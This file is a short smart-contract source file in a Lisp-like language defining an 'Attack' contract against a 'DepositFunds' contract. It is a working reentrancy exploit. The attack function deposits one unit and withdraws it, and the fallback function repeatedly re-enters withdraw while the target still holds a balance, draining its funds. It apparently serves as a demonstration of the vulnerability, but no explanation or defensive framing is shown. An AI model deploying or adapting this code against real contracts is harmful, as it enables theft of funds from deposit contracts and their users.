(define Attack
  (contract
    (depositFunds DepositFunds)

    (constructor
      (lambda (_depositFundsAddress)
        (set! depositFunds (DepositFunds _depositFundsAddress))))

    (fallback
      (lambda ()
      ; need to change fund to something else
        (if (>= (balance depositFunds) (toFunds 1 'fund))
          (withdraw depositFunds))))

    (function attack
      (lambda ()
        (require (>= (msg.value) (toFunds 1 'fund)))
        (deposit depositFunds (toFunds 1 'fund))
        (withdraw depositFunds)))))
